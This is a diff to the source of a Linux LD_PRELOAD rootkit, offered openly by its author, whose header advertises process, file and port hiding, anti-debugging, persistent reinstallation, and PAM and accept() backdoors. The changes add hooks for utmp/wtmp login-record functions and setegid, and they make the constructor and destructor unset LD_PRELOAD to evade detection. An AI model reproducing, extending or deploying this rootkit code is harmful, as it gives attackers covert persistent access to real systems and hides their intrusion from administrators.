@@ -7,19 +7,20 @@
  *     ╚████╔╝ ███████╗██║  ██║██║ ╚████║   ██║   
  *      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   
  *                                           
- *  LD_PRELOAD based rootkit for x86_64, i686 and ARM architectures
+ *  LD_PRELOAD rootkit for x86, x86_64, and ARM architectures
  *  complete with gid based process hiding,
  *                xattr based file hiding,
  *                network port hiding,
  *                anti-detection, anti-debug,
- *                persistent installation,
+ *                dynamic linker modifications,
+ *                persistent (re)installation,
  *                execve commands,
  *                PAM (ssh/sftp) backdoor,
  *                accept() SSL/plaintext backdoor,
  *                easy-to-use installation script,
  *                incredibly robust configuration
  *                     
- *  contact: mem@xmpp.is
+ *  contact: mem@xmpp.is, @mempodippy
  *  btc addr: 1FfLiA4P5KHzKUHgCnMCVguJUgYJ8edW4B
  *
  *  credits:
@@ -128,8 +129,7 @@
 #include "symbols/xattr/remove/lremovexattr.c" // (int lremovexattr())
 #include "symbols/xattr/remove/fremovexattr.c" // (int fremovexattr())
 
-// libc ptrace() function - this was originally in Azazel as a debugging countermeasure, but I've adapted it slightly
-// so that it doesn't fuckin brick your box. by adapted I mean it's optional lolol
+// libc ptrace() function
 // http://man7.org/linux/man-pages/man2/ptrace.2.html
 #include "symbols/hiding/debug/ptrace.c" // (long ptrace())
 
@@ -246,7 +246,14 @@
 // };
 #include "symbols/utmp/getutent.c"
 #include "symbols/utmp/getutxent.c"
+#include "symbols/utmp/getutid.c"
+#include "symbols/utmp/getutxid.c"
 #include "symbols/utmp/pututline.c"
+#include "symbols/utmp/pututxline.c"
+#include "symbols/utmp/getutmp.c"
+#include "symbols/utmp/getutmpx.c"
+#include "symbols/utmp/updwtmp.c"
+#include "symbols/utmp/updwtmpx.c"
 #include "symbols/utmp/login.c"
 
 // i had to break socket so that it would read from /proc/net/tcp (or our fake one :p)
@@ -262,6 +269,7 @@
 // http://linux.die.net/man/2/setregid
 // http://linux.die.net/man/2/setresgid
 #include "symbols/gid/setgid.c" // (int setgid())
+#include "symbols/gid/setegid.c" // (int setegid()) -- prevents screen from changing the effective gid
 #include "symbols/gid/setregid.c" // (int setregid())
 #include "symbols/gid/setresgid.c" // (int setresgid())
 
@@ -295,6 +303,7 @@
 
 void __attribute ((constructor)) init (void)
 {
+    if(getenv("LD_PRELOAD") != NULL) unsetenv("LD_PRELOAD");
     char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
     HOOK(old_opendir, COPENDIR);
     DIR *check_presence = old_opendir(install_dir); // does our hidden directory still exist?
@@ -304,6 +313,7 @@ void __attribute ((constructor)) init (void)
 
 void __attribute ((destructor)) vexit (void)
 {
+    if(getenv("LD_PRELOAD") != NULL) unsetenv("LD_PRELOAD");
     char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
     HOOK(old_opendir, COPENDIR);
     DIR *check_presence = old_opendir(install_dir);
